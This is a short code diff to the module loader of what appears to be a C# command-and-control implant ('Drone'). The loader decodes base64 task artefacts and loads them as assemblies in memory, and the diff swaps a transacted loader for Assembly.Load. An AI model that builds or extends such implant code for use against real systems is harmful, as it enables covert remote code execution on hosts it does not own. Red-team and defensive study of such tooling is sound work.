@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Reflection;
 using System.Threading;
 
 using Drone.Models;
@@ -39,8 +40,7 @@ namespace Drone.Modules
         private void LoadModule(DroneTask task, CancellationToken token)
         {
             var bytes = Convert.FromBase64String(task.Artefact);
-            var transact = new TransactedAssembly();
-            var asm = transact.Load(bytes);
+            var asm = Assembly.Load(bytes);
             
             Drone.LoadDroneModule(asm);
         }
